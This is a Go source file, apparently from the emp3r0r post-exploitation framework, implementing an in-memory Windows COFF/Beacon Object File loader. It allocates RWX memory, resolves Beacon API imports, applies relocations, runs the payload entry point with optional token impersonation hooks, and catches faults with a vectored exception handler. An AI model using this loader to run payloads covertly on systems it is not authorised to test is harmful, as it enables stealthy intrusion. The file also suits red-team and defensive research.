//go:build windows

package coffloader

import (
	"fmt"
	"runtime"
	"runtime/debug"
	"strings"
	"sync"
	"syscall"
	"unsafe"

	"github.com/RIscRIpt/pecoff"
	"github.com/RIscRIpt/pecoff/binutil"
	"github.com/RIscRIpt/pecoff/windef"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"golang.org/x/sys/windows"
)

var (
	PreExecHook  func(token uintptr)
	PostExecHook func()
	hooksMu      sync.RWMutex
)

const (
	MEM_COMMIT             = windows.MEM_COMMIT
	MEM_RESERVE            = windows.MEM_RESERVE
	PAGE_EXECUTE_READWRITE = windows.PAGE_EXECUTE_READWRITE
	PAGE_EXECUTE_READ      = windows.PAGE_EXECUTE_READ
	PAGE_READWRITE         = windows.PAGE_READWRITE
	IMAGE_SCN_MEM_EXECUTE  = 0x20000000
)

var (
	kernel32                        = syscall.MustLoadDLL("kernel32.dll")
	procVirtualAlloc                = kernel32.MustFindProc("VirtualAlloc")
	procVirtualProtect              = kernel32.MustFindProc("VirtualProtect")
	procVirtualFree                 = kernel32.MustFindProc("VirtualFree")
	procAddVectoredExceptionHandler = kernel32.MustFindProc("AddVectoredExceptionHandler")

	vehHandlerHandle uintptr

	bofFaultMu     sync.Mutex
	isExecutingBOF bool
	currentFault   bofFault
	hasFaulted     bool
)

type bofFault struct {
	code uint32
	addr uintptr
}

type exceptionRecordStruct struct {
	ExceptionCode        uint32
	ExceptionFlags       uint32
	ExceptionRecord      uintptr
	ExceptionAddress     uintptr
	NumberParameters     uint32
	ExceptionInformation [15]uintptr
}

type exceptionPointersStruct struct {
	ExceptionRecord *exceptionRecordStruct
	ContextRecord   uintptr
}

var vehOnce sync.Once

func initVEH() {
	vehOnce.Do(func() {
		handlerCallback := windows.NewCallback(vehHandler)
		ret, _, _ := procAddVectoredExceptionHandler.Call(1, handlerCallback)
		vehHandlerHandle = ret
	})
}

func vehHandler(exceptionPointers uintptr) uintptr {
	if exceptionPointers == 0 {
		return 0 // EXCEPTION_CONTINUE_SEARCH
	}

	bofFaultMu.Lock()
	executing := isExecutingBOF
	savedRsp := currentSavedRSP
	bofFaultMu.Unlock()

	if !executing || savedRsp == 0 {
		return 0 // EXCEPTION_CONTINUE_SEARCH
	}

	ep := (*exceptionPointersStruct)(unsafe.Pointer(exceptionPointers))
	if ep == nil || ep.ExceptionRecord == nil || ep.ContextRecord == 0 {
		return 0
	}

	code := ep.ExceptionRecord.ExceptionCode
	// Only catch hardware exceptions (0xC0000000-0xCFFFFFFF, 0x80000001, 0x80000002).
	// Software exceptions (e.g. C++ 0xE0xxxxxx, CLR 0xE0434352) are passed through
	// so internal BOF exception handling (try/catch) continues to work.
	isHardwareExc := (code&0xF0000000) == 0xC0000000 || code == 0x80000001 || code == 0x80000002

	if isHardwareExc {
		bofFaultMu.Lock()
		currentFault = bofFault{code: code, addr: ep.ExceptionRecord.ExceptionAddress}
		hasFaulted = true
		isExecutingBOF = false
		bofFaultMu.Unlock()

		// Read return address inside callBOF right after CALL AX from *(savedRsp - 8).
		// Safely restore RSP to callBOF stack frame pointer (savedRsp - 8) and redirect RIP to retAddr.
		// When NtContinue resumes execution, callBOF executes ADDQ $32, SP; RET,
		// returning cleanly back into invokeMethod without invalidating Go's stack unwinder.
		retAddr := *(*uintptr)(unsafe.Pointer(savedRsp))
		if unsafe.Sizeof(uintptr(0)) == 8 {
			// 64-bit AMD64: RSP is at offset 0x98 (152), RIP is at offset 0xF8 (248) inside CONTEXT
			*(*uintptr)(unsafe.Pointer(ep.ContextRecord + 0x98)) = savedRsp
			*(*uintptr)(unsafe.Pointer(ep.ContextRecord + 0xF8)) = retAddr
		} else {
			// 32-bit x86: ESP is at offset 0xC4 (196), EIP is at offset 0xB4 (180) inside CONTEXT
			*(*uintptr)(unsafe.Pointer(ep.ContextRecord + 0xC4)) = savedRsp
			*(*uintptr)(unsafe.Pointer(ep.ContextRecord + 0xB4)) = retAddr
		}

		return ^uintptr(0) // EXCEPTION_CONTINUE_EXECUTION (-1)
	}

	return 0 // EXCEPTION_CONTINUE_SEARCH
}

func virtualProtectError(ret uintptr, err error) error {
	if ret != 0 {
		return nil
	}
	if err != nil {
		return fmt.Errorf("Error calling VirtualProtect: %w", err)
	}
	return fmt.Errorf("Error calling VirtualProtect (returned 0)")
}

func resolveExternalAddress(symbolName string, outChannel chan<- any) uintptr {
	if strings.HasPrefix(symbolName, "__imp_") {
		symbolName = symbolName[6:]
		symbolName = strings.TrimPrefix(symbolName, "_")

		libName := ""
		procName := ""
		parts := strings.Split(symbolName, "$")
		if len(parts) == 2 {
			libName = parts[0] + ".dll"
			procName = parts[1]
		} else {
			procName = symbolName

			switch procName {
			case "FreeLibrary", "LoadLibraryA", "GetProcAddress", "GetModuleHandleA", "GetModuleFileNameA":
				libName = "kernel32.dll"
			case "MessageBoxA":
				libName = "user32.dll"
			case "BeaconOutput":
				return windows.NewCallback(GetCoffOutputForChannel(outChannel))
			case "BeaconDataParse":
				return windows.NewCallback(DataParse)
			case "BeaconDataInt":
				return windows.NewCallback(DataInt)
			case "BeaconDataShort":
				return windows.NewCallback(DataShort)
			case "BeaconDataLength":
				return windows.NewCallback(DataLength)
			case "BeaconDataExtract":
				return windows.NewCallback(DataExtract)
			case "BeaconPrintf":
				return windows.NewCallback(GetCoffPrintfForChannel(outChannel))
			case "BeaconAddValue":
				return windows.NewCallback(AddValue)
			case "BeaconGetValue":
				return windows.NewCallback(GetValue)
			case "BeaconRemoveValue":
				return windows.NewCallback(RemoveValue)
			case "BeaconFormatAlloc":
				return windows.NewCallback(BeaconFormatAlloc)
			case "BeaconFormatReset":
				return windows.NewCallback(BeaconFormatReset)
			case "BeaconFormatFree":
				return windows.NewCallback(BeaconFormatFree)
			case "BeaconFormatAppend":
				return windows.NewCallback(BeaconFormatAppend)
			case "BeaconFormatPrintf":
				return windows.NewCallback(BeaconFormatPrintf)
			case "BeaconFormatToString":
				return windows.NewCallback(BeaconFormatToString)
			case "BeaconFormatInt":
				return windows.NewCallback(BeaconFormatInt)
			case "BeaconUseToken", "BeaconRevertToken", "BeaconIsAdmin", "BeaconGetSpawnTo",
				"BeaconSpawnTemporaryProcess", "BeaconInjectProcess", "BeaconInjectTemporaryProcess",
				"BeaconCleanupProcess", "toWideChar", "BeaconGetOutputData":
				fallthrough
			default:
				logging.Warningf("Unknown symbol: %s\n", procName)
				return 0
			}
		}

		if strings.EqualFold(libName, "MSVCRT.dll") {
			if procName == "vsnprintf" || procName == "_vsnprintf" {
				if ntdll, err := syscall.LoadLibrary("ntdll.dll"); err == nil && ntdll != 0 {
					if addr, err := syscall.GetProcAddress(ntdll, "_vsnprintf"); err == nil && addr != 0 {
						return addr
					}
				}
			}
			if ucrt, err := syscall.LoadLibrary("ucrtbase.dll"); err == nil && ucrt != 0 {
				if addr, err := syscall.GetProcAddress(ucrt, procName); err == nil && addr != 0 {
					return addr
				}
				if strings.HasPrefix(procName, "_") {
					if addr, err := syscall.GetProcAddress(ucrt, strings.TrimPrefix(procName, "_")); err == nil && addr != 0 {
						return addr
					}
				} else {
					if addr, err := syscall.GetProcAddress(ucrt, "_"+procName); err == nil && addr != 0 {
						return addr
					}
				}
			}
		}

		libStringPtr, err := syscall.LoadLibrary(libName)
		if err != nil {
			logging.Errorf("Failed to load library %s for symbol %s: %v", libName, symbolName, err)
			return 0
		}
		procAddress, err := syscall.GetProcAddress(libStringPtr, procName)
		if err != nil || procAddress == 0 {
			if strings.HasPrefix(procName, "_") {
				procAddress, err = syscall.GetProcAddress(libStringPtr, strings.TrimPrefix(procName, "_"))
			} else {
				procAddress, err = syscall.GetProcAddress(libStringPtr, "_"+procName)
			}
		}
		if err != nil || procAddress == 0 {
			logging.Errorf("Failed to get proc address %s in %s for symbol %s: %v", procName, libName, symbolName, err)
			return 0
		}
		return procAddress
	}
	return 0
}

func virtualAlloc(lpAddress uintptr, dwSize uintptr, flAllocationType uint32, flProtect uint32) (uintptr, error) {
	ret, _, err := procVirtualAlloc.Call(
		lpAddress,
		dwSize,
		uintptr(flAllocationType),
		uintptr(flProtect),
	)
	if ret == 0 {
		if err != nil && err != windows.ERROR_SUCCESS {
			return 0, fmt.Errorf("VirtualAlloc call failed: %w", err)
		}
		return 0, fmt.Errorf("VirtualAlloc call returned NULL")
	}
	return ret, nil
}

func isSpecialSymbol(sym *pecoff.Symbol) bool {
	if sym == nil {
		return false
	}
	return sym.StorageClass == windef.IMAGE_SYM_CLASS_EXTERNAL && sym.SectionNumber == 0
}

func isImportSymbol(sym *pecoff.Symbol) bool {
	if sym == nil {
		return false
	}
	return strings.HasPrefix(sym.NameString(), "__imp_")
}

func processRelocation(symbolDefAddress uintptr, sectionAddress uintptr, reloc windef.Relocation, _ *pecoff.Symbol) error {
	if sectionAddress == 0 {
		return fmt.Errorf("invalid section address (0)")
	}
	symbolOffset := uintptr(reloc.VirtualAddress)
	absoluteSymbolAddress := symbolOffset + sectionAddress

	switch reloc.Type {
	case windef.IMAGE_REL_AMD64_ADDR64:
		addr := (*uint64)(unsafe.Pointer(absoluteSymbolAddress))
		*addr = uint64(symbolDefAddress)
	case windef.IMAGE_REL_AMD64_ADDR32NB:
		addr := (*uint32)(unsafe.Pointer(absoluteSymbolAddress))
		valueToWrite := symbolDefAddress - (sectionAddress + uintptr(reloc.VirtualAddress) + 4)
		*addr = uint32(valueToWrite)
	case windef.IMAGE_REL_AMD64_REL32, windef.IMAGE_REL_AMD64_REL32_1, windef.IMAGE_REL_AMD64_REL32_2, windef.IMAGE_REL_AMD64_REL32_3, windef.IMAGE_REL_AMD64_REL32_4, windef.IMAGE_REL_AMD64_REL32_5:
		addend := int32(*(*uint32)(unsafe.Pointer(absoluteSymbolAddress)))
		target := symbolDefAddress + uintptr(addend)
		relocOffset := absoluteSymbolAddress + 4 + (uintptr(reloc.Type) - uintptr(windef.IMAGE_REL_AMD64_REL32))
		relativeSymbolDefAddress := target - relocOffset
		addr := (*uint32)(unsafe.Pointer(absoluteSymbolAddress))
		*addr = uint32(relativeSymbolDefAddress)
	default:
		return fmt.Errorf("unsupported relocation type: %d", reloc.Type)
	}
	return nil
}

type CoffSection struct {
	Section *pecoff.Section
	Address uintptr
}

func CoffLoad(coffBytes []byte, argBytes []byte) (string, error) {
	return LoadWithToken(coffBytes, argBytes, "go", 0)
}

// AlterProtection changes permissions of a memory section
func AlterProtection(oldProtect, newProtect int, addr, size uintptr) error {
	retVirtualProtect, _, errVirtualProtect := procVirtualProtect.Call(addr, uintptr(size), uintptr(newProtect), uintptr(unsafe.Pointer(&oldProtect)))
	if err := virtualProtectError(retVirtualProtect, errVirtualProtect); err != nil {
		return err
	}
	return nil
}

func LoadWithMethod(coffBytes []byte, argBytes []byte, method string) (string, error) {
	return LoadWithToken(coffBytes, argBytes, method, 0)
}

func LoadWithToken(coffBytes []byte, argBytes []byte, method string, token uintptr) (res string, err error) {
	var baseBlockAddr uintptr
	var totalSize uintptr

	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("LoadWithMethod panic: %v\n%s", r, debug.Stack())
			if baseBlockAddr != 0 && totalSize != 0 {
				_ = AlterProtection(PAGE_EXECUTE_READ, PAGE_READWRITE, baseBlockAddr, totalSize)
				procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
			}
		}
	}()

	parsedCoff := pecoff.Explore(binutil.WrapByteSlice(coffBytes))
	if parsedCoff == nil {
		return "", fmt.Errorf("failed to explore COFF file: null handle")
	}

	if err := parsedCoff.ReadAll(); err != nil {
		return "", fmt.Errorf("failed to read COFF structure: %w", err)
	}

	parsedCoff.Seal()

	sections := make(map[string]CoffSection)
	gotSize := uint32(0)

	gotMap := make(map[string]uintptr)
	gotOffset := 0

	bssBaseAddress := uintptr(0)
	bssOffset := 0
	bssSize := uint32(0)

	for _, symbol := range parsedCoff.Symbols {
		if symbol == nil {
			continue
		}
		if isSpecialSymbol(symbol) {
			if isImportSymbol(symbol) {
				gotSize += 8
			} else {
				bssSize += symbol.Value + 8
			}
		}
	}

	sectionOffsets := make(map[string]uintptr)

	for _, section := range parsedCoff.Sections.Array() {
		if section == nil {
			continue
		}
		allocationSize := uintptr(section.SizeOfRawData)
		if strings.HasPrefix(section.NameString(), ".bss") {
			allocationSize = uintptr(bssSize)
		}

		if allocationSize == 0 {
			continue
		}

		if totalSize%16 != 0 {
			totalSize += 16 - (totalSize % 16)
		}
		sectionOffsets[section.NameString()] = totalSize
		totalSize += allocationSize
	}

	gotOffsetInBlock := uintptr(0)
	if gotSize > 0 {
		if totalSize%16 != 0 {
			totalSize += 16 - (totalSize % 16)
		}
		gotOffsetInBlock = totalSize
		totalSize += uintptr(gotSize)
	}

	if totalSize == 0 {
		return "", fmt.Errorf("invalid COFF: total allocation size is 0")
	}

	var allocErr error
	baseBlockAddr, allocErr = virtualAlloc(0, totalSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if allocErr != nil {
		return "", fmt.Errorf("VirtualAlloc failed for COFF payload (%d bytes): %w", totalSize, allocErr)
	}

	gotBaseAddress := uintptr(0)
	if gotSize > 0 {
		gotBaseAddress = baseBlockAddr + gotOffsetInBlock
	}

	// Populate memory block
	for _, section := range parsedCoff.Sections.Array() {
		if section == nil {
			continue
		}

		offset, exists := sectionOffsets[section.NameString()]
		if !exists {
			continue
		}

		destAddr := baseBlockAddr + offset
		sections[section.NameString()] = CoffSection{
			Section: section,
			Address: destAddr,
		}

		if strings.HasPrefix(section.NameString(), ".bss") {
			bssBaseAddress = destAddr
			continue
		}

		rawData := section.RawData()
		if len(rawData) > 0 {
			copy((*[1 << 30]byte)(unsafe.Pointer(destAddr))[:len(rawData)], rawData)
		}
	}

	output := make(chan any, 1000)

	// Process relocations
	for _, sectionVirtualAddr := range sections {
		if sectionVirtualAddr.Section == nil {
			continue
		}

		for _, reloc := range sectionVirtualAddr.Section.Relocations() {
			if int(reloc.SymbolTableIndex) >= len(parsedCoff.Symbols) {
				procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
				return "", fmt.Errorf("relocation symbol table index %d out of bounds (%d symbols)", reloc.SymbolTableIndex, len(parsedCoff.Symbols))
			}

			symbol := parsedCoff.Symbols[reloc.SymbolTableIndex]
			if symbol == nil || symbol.StorageClass > 3 {
				continue
			}

			symbolDefAddress := uintptr(0)

			if isSpecialSymbol(symbol) {
				if isImportSymbol(symbol) {
					externalAddress := resolveExternalAddress(symbol.NameString(), output)

					if externalAddress == 0 {
						procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
						return "", fmt.Errorf("failed to resolve external address for symbol: %s", symbol.NameString())
					}

					if existingGotAddress, exists := gotMap[symbol.NameString()]; exists {
						symbolDefAddress = existingGotAddress
					} else {
						symbolDefAddress = gotBaseAddress + uintptr(gotOffset*8)
						gotOffset += 1
						gotMap[symbol.NameString()] = symbolDefAddress
					}
					copy((*[8]byte)(unsafe.Pointer(symbolDefAddress))[:], (*[8]byte)(unsafe.Pointer(&externalAddress))[:])
				} else {
					if bssBaseAddress == 0 {
						procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
						return "", fmt.Errorf("bssBaseAddress is 0 when resolving symbol %s", symbol.NameString())
					}
					symbolDefAddress = bssBaseAddress + uintptr(bssOffset)
					bssOffset += int(symbol.Value) + 8
				}
			} else {
				secIdx := int(symbol.SectionNumber) - 1
				if secIdx < 0 || secIdx >= len(parsedCoff.Sections.Array()) {
					procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
					return "", fmt.Errorf("invalid section number %d for symbol %s", symbol.SectionNumber, symbol.NameString())
				}
				targetSection := parsedCoff.Sections.Array()[secIdx]
				if targetSection == nil {
					procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
					return "", fmt.Errorf("target section for symbol %s is nil", symbol.NameString())
				}
				targetCoffSec, ok := sections[targetSection.NameString()]
				if !ok {
					procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
					return "", fmt.Errorf("target section %s not allocated", targetSection.NameString())
				}
				symbolDefAddress = targetCoffSec.Address + uintptr(symbol.Value)
			}

			if relocErr := processRelocation(symbolDefAddress, sectionVirtualAddr.Address, reloc, symbol); relocErr != nil {
				procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
				return "", fmt.Errorf("relocation failed for symbol %s: %w", symbol.NameString(), relocErr)
			}
		}
	}

	// Change memory protection of the entire BOF block to PAGE_EXECUTE_READWRITE
	if errProtect := AlterProtection(PAGE_READWRITE, PAGE_EXECUTE_READWRITE, baseBlockAddr, totalSize); errProtect != nil {
		procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)
		return "", fmt.Errorf("failed to change BOF memory permissions: %w", errProtect)
	}

	// Call the entry point
	go invokeMethod(method, argBytes, parsedCoff, sections, output, token)

	var bofOutput strings.Builder
	var bofErr error
	for msg := range output {
		if s, ok := msg.(string); ok {
			if strings.HasPrefix(s, "BOF native exception:") || strings.HasPrefix(s, "Panic occurred") || strings.HasPrefix(s, "Entry symbol") {
				bofErr = fmt.Errorf("%s", strings.TrimSpace(s))
			}
			bofOutput.WriteString(s)
			bofOutput.WriteString("\n")
		} else if msg != nil {
			bofOutput.WriteString(fmt.Sprintf("%v\n", msg))
		}
	}

	// Zero out and release memory block
	memSlice := unsafe.Slice((*byte)(unsafe.Pointer(baseBlockAddr)), totalSize)
	clear(memSlice)
	procVirtualFree.Call(baseBlockAddr, 0, windows.MEM_RELEASE)

	return bofOutput.String(), bofErr
}

func invokeMethod(methodName string, argBytes []byte, parsedCoff *pecoff.File, sectionMap map[string]CoffSection, outChannel chan<- any, token uintptr) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()
	defer close(outChannel)

	defer func() {
		if r := recover(); r != nil {
			outChannel <- fmt.Sprintf("Panic occurred when executing COFF: %v\n%s", r, debug.Stack())
		}
	}()

	if parsedCoff == nil || parsedCoff.Sections == nil {
		outChannel <- "COFF file structure is invalid or nil"
		return
	}

	found := false
	for _, symbol := range parsedCoff.Symbols {
		if symbol == nil || symbol.NameString() != methodName {
			continue
		}
		found = true

		secIdx := int(symbol.SectionNumber) - 1
		if secIdx < 0 || secIdx >= len(parsedCoff.Sections.Array()) {
			outChannel <- fmt.Sprintf("Invalid section number %d for entry symbol %s", symbol.SectionNumber, methodName)
			return
		}
		mainSection := parsedCoff.Sections.Array()[secIdx]
		if mainSection == nil {
			outChannel <- fmt.Sprintf("Entry section for symbol %s is nil", methodName)
			return
		}
		sec, ok := sectionMap[mainSection.NameString()]
		if !ok || sec.Address == 0 {
			outChannel <- fmt.Sprintf("Entry section %s memory not allocated", mainSection.NameString())
			return
		}
		entryPoint := sec.Address + uintptr(symbol.Value)

		// BOF always reads a 4-byte length prefix regardless of argc.
		// Provide a zero-length buffer so the BOF sees no arguments.
		if len(argBytes) == 0 {
			argBytes = make([]byte, 4)
		}

		// Optionally impersonate before calling the BOF.
		hooksMu.RLock()
		preHook := PreExecHook
		postHook := PostExecHook
		hooksMu.RUnlock()

		if token != 0 && preHook != nil {
			preHook(token)
			defer func() {
				if postHook != nil {
					postHook()
				}
			}()
		}

		initVEH()

		bofFaultMu.Lock()
		isExecutingBOF = true
		hasFaulted = false
		currentFault = bofFault{}
		bofFaultMu.Unlock()

		syscall.SyscallN(entryPoint, uintptr(unsafe.Pointer(&argBytes[0])), uintptr(len(argBytes)))

		bofFaultMu.Lock()
		faulted := hasFaulted
		fault := currentFault
		isExecutingBOF = false
		currentSavedRSP = 0
		bofFaultMu.Unlock()

		if faulted {
			outChannel <- fmt.Sprintf("BOF native exception: code=0x%08X addr=0x%X", fault.code, fault.addr)
		}
	}
	if !found {
		outChannel <- fmt.Sprintf("Entry symbol '%s' not found in COFF", methodName)
	}
}
